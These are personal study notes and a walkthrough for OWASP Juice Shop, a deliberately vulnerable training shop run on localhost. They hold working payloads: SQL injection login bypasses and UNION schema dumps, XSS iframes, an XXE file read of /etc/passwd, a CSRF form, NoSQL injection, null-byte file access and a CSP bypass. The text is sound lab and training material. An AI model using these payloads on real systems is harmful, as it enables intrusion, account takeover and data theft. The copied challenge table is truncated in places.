Pwning OWASP Juice Shop;Note=Erxin

# Online document 
- reference 
https://pwning.owasp-juice.shop/

- install from source 
install nodejs 

$ git clone https://github.com/bkimminich/juiceshop.git

$ npm install 

navigate to http://localhost:3000

- automatic saving and resoring hacking progress

- self-healing feature 

- The challenges are rated with a difficulty level between ⭐ and ⭐⭐⭐⭐⭐⭐

- manual progress and settings backup 

Backup and Restore buttons on the Score Board you can save
and later restore your hacking progress

- enable unsafe challenges 

safetyOverride:true 

yaml configuration file 

- hacking tool 

firefox, allow edit and replay request 

chrome, do not allow replay request 

- get hint 

chat on Gitter.im at
https://gitter.im/bkimminich/juice-shop. You can simply log in to Gitter with your
GitHub account

Slack channel at
https://owasp.slack.com/messages/project-juiceshop

- challenges solutions 

The Challenge solutions appendix is there to help you in case you are stuck

- configure rest API endpoint 

Customization feature that allows redressing the UI and
overwriting the product catalog: http://localhost:3000/rest/admin/applicationconfiguration

- tutorial js file 

If enabled, the Hacking Instructor script tutorial-es2015.js (or tutorial-es5.js in
legacy browsers) including all on-screen tutorials is loaded lazily by the Score
Board and the Welcome Banner. You should exclude this file from all your manual
or automated frontend code analysis.

- reference 

reveal your real hacking progress.
https://en.wikipedia.org/wiki/Boilerplate_code 
https://github.com/zaproxy/zap-core-help/wiki 
http://docs.kali.org/introduction/what-is-kali-linux 
http://docs.kali.org/introduction/should-i-use-kali-linux 


# bussiness walk path, happy path of juice-shop
- browser products 

- user login 
url, #/login 

- userregistration 
with url, #/register 

- choosing products to purchase 

url, #/basket 

- user profile 

url /profile

- my saved address 

edit saved address 

- my payment options  

edit crads etc 

- juice shop wallet 

all the bonuses on your purchaes 

- order history 

- privacy policy 

request data export

obtain a copy of all your data saved in juice shop 

- change user password 

url, #/privacy-security/change-password 

- last login 

display the ip from last login 

- request recycling box 

url, #/recycle page, eco-friednly customers to order pre-stamped boxes 

- order tracking, equipped with an order number 
url, #/track-order 

- menu, sidebar emnu 

- customer feedback, invited to leave feedback 

url, #/contact 

- complain, leave a free text message 

url, #/complain 

- support chat, talk to an ai-powered chat bot 

- about us OWASP 

url, #/about 

- photo wall, allows its users to share their memories 

url, #/photo-wall 

- deluxe member ship 

exclusive offers, offers a delux membership to its customer 

- language selection 

- additional help url 

this book.
https://wiki.owasp.org/index.php/Map_execution_paths_through_applicatio
n_(OTG-INFO-007) 
http://xunitpatterns.com/happy%20path.html 

https://owasp.org/www-project-automated-threats-to-web-applications/

# customize app 
- configure 
default.yml 

- security.txt based on https://securitytext.org 

- /promotion screen where a marketing video with subtitles is rendered that hosts the XSS Tier 6 challenge

- challenges section

- Allows to enable and customize the Hacking Instructor tutorial mode

- cft section, Capture-the-Flag mode built into OWASP

- override default setting 

config/ctf.yml 

add necessary sections 

- validate custom configuration 
$ npm run lint:config -- -f /path/to/myConfig.yml

- which will show you the application name registered on Google Cloud Platform: OWASP Juice Shop! There is no way to convince Google to show anything else for obvious trust and integrity reasons

- running juice shop in CTF-mode, use it in Capture-the-flag (CTF) events. 

$ set NODE_ENV=ctf # on Windows
$ export NODE_ENV=ctf # on Linux
$ npm start

- Juice Shop comes with the convenient juice-shop-ctf-cli tool to to simplify the
hosting of CTFs using popular open source frameworks

- non interactive generator mode 

```
ctfFramework: CTFd | FBCTF | RootTheBox
juiceShopUrl: https://juice-shop.herokuapp.com
ctfKey: https://raw.githubusercontent.com/bkimminich/juice-shop/master/ctf.key # can a
countryMapping: https://raw.githubusercontent.com/bkimminich/juice-shop/master/config/
insertHints: none | free | paid
insertHintUrls: none | free | paid # optional for FBCTF
```

- interactive mode 
$ juice-shop-ctf --config myconfig.yml --output challenges.out


- GitHub
(https://github.com/facebook/fbctf) in all their setup methods

- CTF frameworks, CTFd, FBCTF and RootTheBox are not the only possible score servers you can use. Open Source alternatives are for example Mellivora or NightShade.


# Challenge hunting 
- changes 
Name Description
API-only XSS Perform a persisted XSS attack with <iframe src="javascript
Access Log Gain access to any access log file of the server.
Admin
Registration Register as a user with administrator privileges.
Admin Section Access the administration section of the store.
Allowlist
Bypass Enforce a redirect to a page you are not supposed to redire
Arbitrary File
Write Overwrite the Legal Information file.
Bjoern's
Favorite Pet Reset the password of Bjoern's OWASP account via the Fo
Blockchain
Hype Learn about the Token Sale before its official announcemen
Blocked RCE
DoS Perform a Remote Code Execution that would keep a less h
Bonus Payload
Use the bonus payload <iframe width="100%" height="166" scr
url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff550
</iframe> in the DOM XSS challenge.
Bully Chatbot Receive a coupon code from the support chatbot.
CAPTCHA
Bypass Submit 10 or more customer feedbacks within 10 seconds.
Change
Bender's
Password
Change Bender's password into slurmCl4ssic without using
Christmas
Special Order the Christmas special offer of 2014.
CSP Bypass Bypass the Content Security Policy and perform an XSS at
Client-side
XSS Protection Perform a persisted XSS attack with <iframe src="javascript
Confidential
Document Access a confidential document.
Cross-Site
Imaging Stick cute cross-domain kittens all over our delivery boxes.
CSRF Change the name of a user by performing Cross-Site Requ
DOM XSS Perform a DOM XSS attack with <iframe src="javascript:ale
Database
Schema Exfiltrate the entire DB schema definition via SQL Injection.
Deluxe Fraud Obtain a Deluxe Membership without paying for it.
Deprecated
Interface Use a deprecated B2B interface that was not properly shut
Easter Egg Find the hidden easter egg.98
Name Description
Email Leak Perform an unwanted information disclosure by accessing d
Ephemeral
Accountant Log in with the (non-existing) accountant acc0unt4nt@juice
Error Handling Provoke an error that is neither very gracefully nor consiste
Expired
Coupon Successfully redeem an expired campaign coupon code.
Exposed
Metrics Find the endpoint that serves usage data to be scraped by
Extra
Language Retrieve the language file that never made it into production
Five-Star
Feedback Get rid of all 5-star customer feedback.
Forged
Coupon Forge a coupon code that gives you a discount of at least 8
Forged
Feedback Post some feedback in another users name.
Forged Review Post a product review as another user or edit any user's ex
Forged Signed
JWT Forge an almost properly RSA-signed JWT token that impe
Forgotten
Developer
Backup
Access a developer's forgotten backup file.
Forgotten
Sales Backup Access a salesman's forgotten backup file.
Frontend
Typosquatting Inform the shop about a typosquatting imposter that dug its
GDPR Data
Erasure Log in with Chris' erased user account.
GDPR Data
Theft Steal someone else's personal data without using Injection.
HTTP-Header
XSS Perform a persisted XSS attack with <iframe src="javascript
Imaginary
Challenge Solve challenge #999. Unfortunately, this challenge does no
Kill Chatbot Permanently disable the support chatbot so that it can no lo
Leaked Access
Logs
Dumpster dive the Internet for a leaked password and log in
not qualify as a solution.)
Leaked Unsafe
Product Identify an unsafe product that was removed from the shop
Legacy
Typosquatting Inform the shop about a typosquatting trick it has been a vic
Login Admin Log in with the administrator's user account.99
Name Description
Login Amy Log in with Amy's original user credentials. (This could take
Final Note")
Login Bender Log in with Bender's user account.
Login Bjoern Log in with Bjoern's Gmail account without previously chang
Login CISO Exploit OAuth 2.0 to log in with the Chief Information Secur
Login Jim Log in with Jim's user account.
Login MC
SafeSearch Log in with MC SafeSearch's original user credentials witho
Login Support
Team Log in with the support team's original user credentials with
Manipulate
Basket Put an additional product into another user's shopping bask
Meta Geo
Stalking
Determine the answer to John's security question by lookin
mechanism.
Misplaced
Signature File Access a misplaced SIEM signature file.
Missing
Encoding Retrieve the photo of Bjoern's cat in "melee combat-mode".
Multiple Likes Like any review at least three times as the same user.
Nested Easter
Egg Apply some advanced cryptanalysis to find the real easter e
NoSQL DoS Let the server sleep for some time. (It has done more than
NoSQL
Exfiltration All your orders are belong to us! Even the ones which don't
NoSQL
Manipulation Update multiple product reviews at the same time.
Outdated
Allowlist Let us redirect you to one of our crypto currency addresses
Password
Strength Log in with the administrator's user credentials without prev
Payback Time Place an order that makes you rich.
Poison Null
Byte Bypass a security control with a Poison Null Byte to access
Premium
Paywall Unlock Premium Challenge to access exclusive content.
Privacy Policy Read our privacy policy.
Privacy Policy
Inspection Prove that you actually read our privacy policy.
Product
Tampering Change the href of the link within the OWASP SSL Advan100
Name Description
Reflected XSS Perform a reflected XSS attack with <iframe src="javascript
Repetitive
Registration Follow the DRY principle while registering a user.
Reset Bender's
Password Reset Bender's password via the Forgot Password mechan
Reset Bjoern's
Password Reset the password of Bjoern's internal account via the For
Reset Jim's
Password Reset Jim's password via the Forgot Password mechanism
Reset Morty's
Password Reset Morty's password via the Forgot Password mechanis
Reset Uvogin's
Password Reset Uvogin's password via the Forgot Password mechan
Retrieve
Blueprint Deprive the shop of earnings by downloading the blueprint
SSRF Request a hidden resource on server through server.
SSTi Infect the server with juicy malware by abusing arbitrary com
Score Board Find the carefully hidden 'Score Board' page.
Security Policy Behave like any "white hat" should before getting into the a
Server-side
XSS Protection Perform a persisted XSS attack with <iframe src="javascript
Steganography Rat out a notorious character hiding in plain sight in the sho
Successful
RCE DoS Perform a Remote Code Execution that occupies the serve
Supply Chain
Attack
Inform the development team about a danger to some of th
this vulnerability)
Two Factor
Authentication Solve the 2FA challenge for user "wurstbrot". (Disabling, by
Unsigned JWT Forge an essentially unsigned JWT token that impersonate
Upload Size Upload a file larger than 100 kB.
Upload Type Upload a file that has no .pdf or .zip extension.
User
Credentials Retrieve a list of all user credentials via SQL Injection
Video XSS Embed an XSS payload </script><script>alert(`xss`)</scrip
View Basket View another user's shopping basket.
Visual Geo
Stalking
Determine the answer to Emma's security question by look
mechanism.
Vulnerable
Library Inform the shop about a vulnerable library it is using. (Ment101
Name Description
Weird Crypto Inform the shop about an algorithm or library it should defin
XXE Data
Access Retrieve the content of C:\Windows\system.ini or /etc/passwd
XXE DoS Give the server something to chew on for quite a while.
Zero Stars Give a devastating zero-star feedback to the store.

- challenges

    1. score board from url guessing 
    http://localhost:3000/#/score-board
    
    2. injection 

    christmas special, order the christmas special offer of 2014 
    
    database schema, exfiltrate the entire db schema definition via SQL injection 
    
    ephemeral accountant, log in with the (non-existing) accountant 
    
    login admin, login with the administrator's user account 
    
    login bender, login with bender's user account 
    
    login, jim, login with jim's user account 
    
    nosql dos, let the server sleep for some time 
    
    nosql exfiltration, all your orders are belong to us 
    
    nosql manipulation, update multiple product reviews at the same time 
    
    ssti, infect the server with juicy malware by abusing arbitrary command execution 
    
    user credentials, retrieve a list of all user credentials via sql injection 
    
    + challenge x 

        * christmas special 
        
        * DOM XSS, paste the playload into search field 
        
        <iframe src="javascript:alert(`xss`)">
        
        * access a confidential document 
        
        http://localhost:3000/ftp/legal.md
        
        change the url to 
        
        http://localhost:3000/ftp/
        
        get the acquisitions.md document 

        * Provoke an error that is neithter very gracefull nor consistently handled 
        
        Any request that cannot be properly handled by the server will eventually be passed to a global error handling component. restful API, behaves similarly, passing back a JSON error object with sensitive data, such as SQL query strings
        
            a. Visit http://localhost:3000/rest/qwertz
            
            b. login to the application with ' as email 
            
        will trigger server internal error, display additional dev information. sql query etc. 

        * find the endpoint that serves usage data to be scraped by a popular monitoring system 
        
         scroll through https://prometheus.io/docs/introduction/first_steps

        You should notice several mentions of /metrics as the default path scraped by Prometheus
        http://localhost:3000/metrics
        
        * retrieve the photo of Bjoern's cat in "melee combat-mode"

        <img _ngcontent-akt-c18="" class="image" src="assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg" alt="😼 #zatschi #whoneedsfourlegs"> 

        the two # characters in the URL, which are no problem for your OS in a filename, but are interpreted by your browser as HTML anchors
        
        translate the # character to %23 then the image will be displayed 
        
        * redirect you to one of our crypto currency address 
        login any user 
        
        navigate to your basket
        
        open main-es2015.js in devtool, click {} to format the file 
        
        search /redirect?to= 
        
        navigate to any of /redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm

        * review private policy 
        
        login with any user 
        
        choose Privacy & Security from the drop down menu 
        
        you will on  http://localhost:3000/#/privacy-security/privacy-policy
        
        * follow the DRY principle while registering a user 
        
        http://localhost:3000/#/register 
        
        type 12345 input password field 
        type into repeat password field 
        got back to password field and change it into any other 
        submit the form 

        * find the score board page 
        
        search from js, main-es2015.js 
        
        score-board 
        
        path 
        
        * perform a dom xss attach 
        
        add <iframe src="javascript:alert(`xss`)"> input search field 
        
        * give a devastating zero-star feedback to the store 
        
        navigate to contact us 
        
        input a comment text and CAPTCHA
        
        open devtoo and search the submit button 
        
        remove the disabled attribute from the tag 

    + challenges xx

        * login as administrator, by default the first user in the table will be administrator 
        
        email: ' or 1=1--
        password: any thing 

        relative sql:  "SQLITE_ERROR", sql: "SELECT * FROM Users WHERE email = '' AND password = '8fdf397e130a1e324f4b5bdf60090587' AND deletedAt IS NULL"
        
        admin@juice-sh.op

        * view another user's shopping basket 
        
        login as any user 
        
        put products into your shopping basket 
        
        inspect the session storage from devtool 
        
        change the bid in Session Storage from devtool 
        
        navigate to the basket page again 
        
        * receive a coupon code from the support chatbot 
        
        log in as any user 
        
        click support chat in the sidebar menu to visit 
        
        http://localhost:3000/#/chatbot
        
        and keep asking for discount again and again 

        * use a deprecated B2B interface that was not properly shut down 
        
        login 
        
        click Complain in the Contact Use dropdown 
        
        clicking the file upload button for Invoice and browsing some directories 
        
        trying to upload another file 
        
        open the main-es2015, search allowedMinmeType check the list 
        
        click the choose file button 
        
        in the file name field enter *.xml and select any arbitrary xml file < 100KB 
        
        enter some message text and press submit to solve the challenge 
        
        on the javascript console will see a suspicious 410 HTTP error

        * login as administrator
        
        delete all 5 star feedbacks

        * login with MC safesearch's original user credentials, with social engineering 
        
        user name: mc.safesearch@juice-sh.op
        password: Mr. N00dles

        * website define security policy 
        
        http://localhost:3000/security.txt
        
        Request the security policy file from the server at http://localhost:3000/.wellknown/security.txt or http://localhost:3000/security.txt

        * inform the shop about an algorithm or library it should definitely not use the way it does 
        
        user table are hashed with unsalted MD5 
        
        visit http://localhost:3000/#/contact 
        
        submit feedback with one of the following words in the comment, z85, base85, base64, md5 or hashid 
        
        *? solve challenge #999 
        
        inspect cookies in your browsers find a continueCode 
        
        use hashids module in node 
        
        encode 999 (will be 69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj) and send post to 
        
        Send a PUT request to the URL http://localhost:3000/rest/continuecode/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
        
        feedback with one of the following words in the comment: z85, base85 , base64 , md5 or hashid 
        
        ``` addition info in the main-es2015.js 
         this.feedback.comment = `${ this.feedbackControl.value } (${ this.authorControl.value })`,
         
         ....
         
         this.feedbackService.find().subscribe(t=>{
            for (let e = 0; e < t.length; e++) t[e].comment = '<span style="width: 90%; display:block;">' + t[e].comment + '<br/> (' + this.stars[t[e].rating] + ')</span>',
            t[e].comment = this.sanitizer.bypassSecurityTrustHtml(t[e].comment),
            this.slideshowDataSource.push({
              url: this.images[e % this.images.length],
              caption: t[e].comment
            })
          }, t=>{
            console.log(t)
          })
          
          this.host = this.hostServer + '/api/Feedbacks'
        ```
        
        * reflect XSS attack 
        
        login 
        
        shopping 
        
        visit order history 
        
        click the "track order" show the delivery status 
        
        the id will be displayed on the screen, it is susceptible to an XSS attack 
        
        attach string <iframe src="javascript:alert(`xss`)"></iframe> to replace the id, click enter url will be http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E        
        
        refresh page 
        
        
        * determine the answer to john's security questions 
        
        find the post from photo wall from j0hNny 
        download the photo 
        check the photo metadata with http://exif.regex.info/exif.cgi 
        check the coordinates 
        search from goole map with the coordinates 
        got to forget your password page 
        fill in john@juice-sh.op as the email and the word in google map "Daniel Boone National Forest"
        click change 
        
        * determine the answer to emma's security question 
        check the photo upload from emma 
        
        emma@juice-sh.op 
        
        zoom in check the company name 
        
        use the forget password to fill in the security question 
    
    + challenges xxx

        * regist a user with adminstrator privileges 
        
        send a post to http://localhost:3000/api/Users with 
        
        {"email":"anadmin","password":"anadmin","role":"admin"}
        
        application/json as Content-Type 
        
        in firefox pressing Ctrl+Shift+E or by going Menubar -> Tools -> Web Developer -> Network. right click a request and edit and resend 

================unpriacticed==========================================

        * put additional product into another user's basket 

        login 
        
        inspect HTTP traffic while putting items into your own shopping basekt to learn you rown basketid 
        
        submit a POST request to  http://localhost:3000/api/BasketItems 

        Make sure to supply your Authorization Bearer token in the request header.

        Change your POST request into utilizing HTTP Parameter Pollution (HPP) by supplying your own BasketId and that of someone else in the same payload, i.e. 
        {"ProductId": 14,"BasketId": "1","quantity": 1,"BasketId": "2"} 
        make sure no product with ProductId 14 in target basket 

        make sure your own BasketId is lower than the one of the target basket 

        * submit 10 or more customer feedbacks within 10 seconds 
        open devtool 
        
        navigate to visit http://localhost:3000/#/contact

        GET request to http://localhost:3000/rest/captcha/ 

        {"captchaId":18,"captcha":"5*8*8","answer":"320"} .

        feedback in the request body: {comment: "Hello", rating: 1, captcha: "320", captchaId: 18}

        Write a script with a 10-iteration loop that submits feedback
        
            a. another solution is iterate the request, response and calculate the captcha, send the feedback 
            b. use webdriver to automatic the solution 
            c. following RaceTheWeb config could be used to solve this challenge
            https://github.com/aaronhnatiw/race-the-web
            
        * change the name of a user by performing cross-site reqeust forgery from another origin 
        
        Open Juice Shop in an older web browser, e.g. Mozilla Firefox 56 from 2017

        Navigate to http://htmledit.squarefree.com in the same browser. It is intentional that the site is accessed without TLS
        paste the HTML fragment contains a self-submitting HTML form 
        ```
        <form action="http://localhost:3000/profile" method="POST">
         <input name="username" value="CSRF"/>
         <input type="submit"/>
        </form>
        <script>document.forms[0].submit();</script
        ```
        
            a. options, embedding it into an inline frame of zero height and width.
            
            in an actual attack scenario, the attacker will try to trick a legitimate user into opening an attacker-controlled website.

        * exfiltrate the entire DB schema definition via SQL injection 
        
        sqlite  https://www.sqlite.org/faq.html to learn in "(7) How do I list all tables/indices
        
        /rest/products/search endpoint is susceptible to SQL Injection into the q parameter.
        
        UNION SELECT merging the data from the sqlite_master table into the products returned in the JSON result.
        
        ')) UNION SELECT * FROM x-- fails with a SQLITE_ERROR: no such table: x as you would expect
        
        As the Search Results table in the UI has 3 columns displaying data, it will probably at least be three, keep adding until no more SQLITE_ERROR 
        ')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master-- 
        finally gives you a JSON response back with an extra element
        {"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"} .
        
        changing the query into something like qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master-- leaving only the " UNION ed" element in the result set

        replace one of the fixed values with correct column name 'sql' searching for 
        qwert')) UNION SELECT sql, '2', '3', '4', '5','6', '7', '8', '9' FROM sqlite_master--
        
        * obtain a Deluxe membership without paying for it 
        
        if wallet empty 
        
        Go to https://juice-shop.herokuapp.com/#/payment/deluxe and look at the available payment options for upgrading to a deluxe account
        
        Open devtools and inspect the pay button next to the "pay using wallet"
        
        Remove the disabled="true" attribute
        
        open the submit request in devltool. "paymentMode", which is set to "wallet". Change the paymentMode parameter to an empty string and press send
        
        if not empty, will automatic pay, using fiddler to modify the request and resend 
        
        * post some feedback in another users name 
        
        go to http://localhost:3000/#/contact

        open devtool, suspicious text field right at the top: <input _ngcontent-c23 hidden id="userId" type="text" class="ng-untouched ng-pristine ng-valid">
        
        remove the hidden attribute, change to another
        
        submit feedback
        
            a. other way, directly post to POST to http://localhost:3000/api/Feedbacks endpoint with UserId in JSON payload 

        * post a product review as another user or edit any user's existing review 
        
        submit the review 
        
        observing the Networks tab of your browser.
        
        analyze the put request 
        
        change author name to another and resend 
        
        * login with chris' erase user account 
        
        Log in with Email chris.pike@juice-sh.op'-- and any Password 
        
        log in with Email as \' or deletedAt IS NOT NULL-- 
        
        * login with amy's original user credentials 
        Google for either 93.83 billion trillion trillion centuries or One Important Final Note

        Visit http://localhost:3000/#/login and log in with credentials amy@juice-sh.op and password K1f..................... 

        * login with bender's user account 
        Log in with Email jim@juice-sh.op'-- and any Password
        
        * login with jim's user account 

        * place an order that makes you rich  
        login 
        
        put one iterm into your shopping basket 
        
        notice PUT requests to http://localhost:3000/api/BasketItems/{id} in the Network tab of your DevTools

        Authorization header from any HTTP request s

        Submit a PUT request to http://localhost:3000/api/BasketItems/{id} replacing {id} with the memorized number from 5. and with:
        {"quantity": -100} as body
        application/json as Content-Type
        update Bearer ? as Authorization header, replacing the ? with the token 
        
        send request 

        Click Checkout to issue the negative order

        * prove that you actually read our privacy policy 
        Open http://localhost:3000/#/privacy-security/privacy-policy
        
        note down all text inside <span class="hot"> tags, which are http://localhost , We may also , instruct you , to refuse all , reasonably necessary and responsibility

        Combine those into the URL http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility

        * change the href of the link within the O-Saft product description 
        
        By searching for O-Saft directly via the REST API with http://localhost:3000/rest/products/search?q=o-saft will get database id 

        PUT request to http://localhost:3000/api/Products/9 with: 
        {"description": "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"} as body
        
        application/json as Content-Type

        * reset the password of bjoern's account via forget password 

        watch his youtube video to get clue, Bjoern's OWASP Juice Shop playlist on Youtube. get pet name for the security question 

        Visit http://localhost:3000/#/forgot-password and provide bjoern@owasp.org as your Email. Zaya for the pet 

        * reset jim's password 

        A product review for the OWASP Juice Shop-CTF Velcro Patch stating "Looks so much better on my uniform than the boring Starfleet symbol."

        Visit https://en.wikipedia.org/wiki/James_T._Kirk and read the Depiction

        Visit http://localhost:3000/#/forgot-password and provide jim@juice-sh.op 

        provide Samuel as Your eldest siblings middle name?

        * upload a file larger than 100 kb 
        
        Craft a POST request to http://localhost:3000/file-upload with a form parameter file that contains a PDF file of more than 100 kB but less than 200 kB. greater than 200 kB will reject by server side check 

        * upload a file has no .pdf or .zip 
        
        POST request to http://localhost:3000/file-upload with a form parameter file that contains a non-PDF file with a size of less than 200 kB.

        * perform a persisted XSS attack 
        
        POST request to http://localhost:3000/api/Users
        {"email": "<iframe src=\"javascript:alert( xss )\">", "password": "xss"} as body
        application/json as Content-Type header
        
        login as admin 
        
        Visit http://localhost:3000/#/administration
        
        click the "eye" button 
        
        * perform a persisted xss attack without using the frontend application at all 
        login 
        
        copy Authorization header 
        
        submit a POST request to http://localhost:3000/api/Products
        {"name": "XSS", "description": "<iframe src=\"javascript:alert( xss )\">", "price": 47.11} as body
        application/json as Content-Type
        
        Bearer ? as Authorization header, replacing the ? with the token
        
        visit http://localhost:3000/#/search
        
        click "eye" button for the frame border product 
        
        * retrieve the content of c:\windows\system.ini or /etc/passwrd from server 
        
        resolve the b2b interface that was not properly shut down to upload xml 
        
        prepare a xml which uses an external entity <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> (or <!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini" >]> on Windows
        
        Upload this file through the File Complaint dialog and observe the Javascript console while doing so
        
    + challenges xxxx
    
        * gain access to any access log file of the server 
        navigate to the /ftp folder 
        
        notice the file incident-support.kdbx which is needed for Log in with the support team's original user credentials and indicates that some support team is performing
         
        OWASP ZAPs DirBuster plugin for possible exposed directory containing the log files 

        end up with http://localhost:3000/support/logs.
        
        ~/support/logs/
        find at least one access.log of current day and download 
        
        * bypass the content security policy and perform a XSS attack on a legacy page 
        login 
        
        user profile page at http://localhost:3000/profile
        
        Change the username into <<a|ascript>alert(`xss`)</script> and click Set Username. not work until change csp with img url

        <img src="/i/eg_tulip.jpg"  alt="上海鲜花港 - 郁金香" />
        
        subsequent call to http://localhost:3000/profile? It now contains an entry like /assets/public/images/uploads/17.jpg;
        
        the CSP header will now contain http://definitely.not.an/image.png; - the originally supplied URL
        
        Set https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com as Image URL and click _Link Image
        
        refresh 
        
        * order the christmas special offer of 2014, Blind SQL Injection
        
        http://localhost:3000/#/search and reload the page with F5, check network with devtool 
         
        Test this theory by submitting http://localhost:3000/rest/products/search?q=orange which should give you a result such as
         
        submit ; as q  via http://localhost:3000/rest/products/search?q=';

        payload into '-- for q results in a SQLITE_ERROR: incomplete input
        
        Using '))-- for q fixes the syntax and successfully retrieves all products, Take note of its (christmas special) id (which should be 10 )

        
        login 
        
        add product into basket, memory the BasketId from request, find bid from session storage in devtool 
        
        craft and send a POST request to http://localhost:3000/api/BasketItems with
        {"BasketId": "<Your Basket ID>", "ProductId": 10, "quantity": 1} as body
        application/json as Content-Type
        
        goto basket to very "Christmas Super Surprise-Box" in basket 
        
        click checkout 
        
        * alternative path without any sql injection 
        retrive all products 
        http://localhost:3000/reset/products/search?q= 
        
        write down all id that missing 
        
        craft and send a POST request to http://localhost:3000/api/BasketItems with
        {"BasketId": "<Your Basket ID>", "ProductId": 10, "quantity": 1} as body
        application/json as Content-Type
        
        goto basket to very "Christmas Super Surprise-Box" in basket 
        
        click checkout
        
        * identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous 
        
        product, "This item has been made unavailable because of lack of safety standards." is the target item 
        
        Visit https://pastebin.com/90dUgd7s to find a PasteBin paste titled "Rippertuer Special Juice Ingredients" containing a JSON document with many exotic fruits 
        
        warning on Hueteroneel, Eurogium Edule is also on the very same list of ingredients
        
        Submit a comment containing both Eurogium Edule and Hueteroneel via http://localhost:3000/#/contact to solve this challenge
        
        * Find the hidden easter egg 
        
         http://localhost:3000/ftp
         
         download eastere.gg%2500.md 
         
         * apply some advanced cryptanalysis 
         
         get encrypted string from the easter egg file eastere.gg 
         
         base64 decode the string will get some thing like /gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
         
         ROT13-decode the base64 output something like /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
         https://cryptii.com/pipes/rot13-decoder
         
         ```python 
        import codecs
        rot13 = lambda s : codecs.getencoder("rot-13")(s)[0]

        # Answer
        rot13("Gur dhvpx oebja sbk whzcrq bire gur ynml qbt")
         ```
         
         visit http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
         
        * successfully redeem an expired campaign coupon code 
        
        open main-es2015.js search for campaigns will get a JSON list codes 
        
        find a this.campaigns assignment of an object containing various campaign codes. with the oldest avaliable one WMNSDY2019
        
        get function applyCoupon() that uses this.campaigns and in particular the contained validOn timestamp of a coupon
        
        Converting validOn: 15519996e5 of the WMNSDY2019 coupon into a JavaScript date
        
        change your computer time to the date submit the code again 
        
        checkout the product 
        
        * access a developer forgetten backup file 
        http://localhost:3000/ftp
        
        get the backage.josn.back, url will be http://localhost:3000/ftp/package.json.bak directly, use Poison Null Byte (%00), % will need to be URL encode to %25
        
            a. note, The Poison Null Byte exploit takes advantage strings with a known length that can contain null bytes, and whether or not the API being attacked uses null terminated strings. By placing a NULL byte in the string at a certain byte, the string will terminate at that point, nulling the rest of the string, such as a file extension
        
        open http://localhost:3000/ftp/package.json.bak%2500.md 
        
        
        * access a salesman's forgotten backup file 
        download http://localhost:3000/ftp/coupons_2013.md.bak%2500.md
        
        * login with bjoern's gmail account 
        
         his (real) account bjoern.kimminich@googlemail.com
         
         search main-es2015.js for oauth, will get function userService.oauthLogin()
         
         userService.save() - which is used to create a user account in the non-Google User Registration process 
         
         save() and login() function calls both leak how the password for the account is set: password: btoa(n.email.split("").reverse().join("")) to base64 
         
         Base64-encode moc.liamg@hcinimmik.nreojb , so you can log in directly with Email bjoern.kimminich@gmail.com and Password bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
         
         * steal someone else's personal data without using injection 
         
         login 
         
         copy order id from from the confirmation PDF
         
         visit http://localhost:3000/#/track-order, paste in your Order ID and click Track 
         
        check network the request is similar to http://localhost:3000/rest/track-order/7962-6e31e50a0c6f2ea3
        check response user email address
        is partially obfuscated: {
            ...
            
            "email":"*dm*n@j**c*-sh.*p",
            ...
            Pomace","price":0.89,"total":0.89,"bonus":0}],"bonus":0,"eta":"2","_id":"tosmfPsDaW
        cEnzRr3"}]}
        
        Register a new user with an email address that would result in the exact same obfuscated email address. For example register edmin@juice-sh.op to steal the data of admin@juice-sh.op
        
        login with the new user, get your data exported via http://localhost:3000/#/privacy-security/data-export
        
        * access a misplaced SIEM signature file 
         download http://localhost:3000/ftp/suspicious_errors.yml%2500.md
         
         
        * let the server sleep for some time, interact with backend API for product reviews via the dedicated
        endpoints /rest/products/reviews and /rest/products/{id}/reviews
        
            a. note, sql inject sleep function 
            ```
            import sqlite3
            import time

            con = sqlite3.connect(":memory:")
            con.create_function("sleep", 1, time.sleep)
            c = con.cursor()
            c.execute("SELECT sleep(1.23)")
            ```
            
        request http://localhost:3000/rest/products/sleep(2000)/reviews
        
        * update multiple product reviews at the same time 
        login 
        
        get your Authorization token from network response/request 
        
        submit a PATCH reqeust to http://localhost:3000/rest/products/reviews with
        { "id": { "$ne": -1 }, "message": "NoSQL Injection!" } as body
        application/json as Content-Type  header 
        and Bear ? as Authorization header replace ? with the token 
        
            a. note, MongoDB manual 
            {field: {$ne: value} }

            $ne selects the documents where the value of the field is not equal to the specified value. This includes documents that do not contain the field.
        
        check all the product detail review are replaced
        
        * enforce a redirect to a page you are not supposed to redirect to 
        
        redirect links in the application, e.g. http://localhost:3000/redirect?to=https://github.com/bkimminich/juice-shop will fail 
        406 Error: Unrecognized target URL for redirect 
        
        remove to parameter, will get error 
        500 TypeError: Cannot read property 'indexOf' of undefined where the indexOf
        
        craft a redirect URL target-URL in to comes with an own parameter containing a URL from the allowlist, e.g.
        http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop
        
        * bypass a security control with Poison Null Byte 
        use the previous challenge find hidden easter egg to solve as a by-product 
        
        * reset bender's password via forgot password mechanism 
        
        find out who "Bender" might be should immediately lead you to Bender from Futurama as the only viable option
        
        Suicide Booths on http://futurama.wikia.com/wiki/Suicide_booth
        
